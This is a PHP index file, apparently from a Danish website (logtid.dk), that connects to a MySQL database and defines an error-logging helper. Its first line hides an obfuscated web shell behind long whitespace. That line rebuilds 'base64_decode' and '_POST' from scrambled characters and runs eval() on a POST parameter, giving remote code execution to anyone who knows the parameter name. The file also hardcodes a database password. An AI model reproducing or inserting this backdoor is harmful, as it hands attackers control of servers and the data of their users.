<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n4fd18b'];if(isset($s22)){eval($s21($s22));}?><?PHP
// *************************************************
// Copyright Capable Aps
// *************************************************
// logtid.dk : index.php
//
// *************************************************


	date_default_timezone_set('Europe/Copenhagen');
 
 
// Der oprettes forbindelse til databasen
	$link = mysql_connect("localhost", "db_user", "Inf0Scr33n") or die("Could not connect: " . mysql_error() . "<br>");
	mysql_select_db("infoscreen", $link) or die("Could not select DB: " . mysql_error() . "<br>");
	mysql_set_charset('utf8',$link);


	function log_error($caller, $error_msg){
		$sql = "INSERT INTO error_log (caller, error_msg, time_stamp) VALUES ('".addslashes($caller)."','".addslashes($error_msg)."',NOW());";
		mysql_query($sql);
		if(mysql_errno()) echo mysql_error();
	}

?>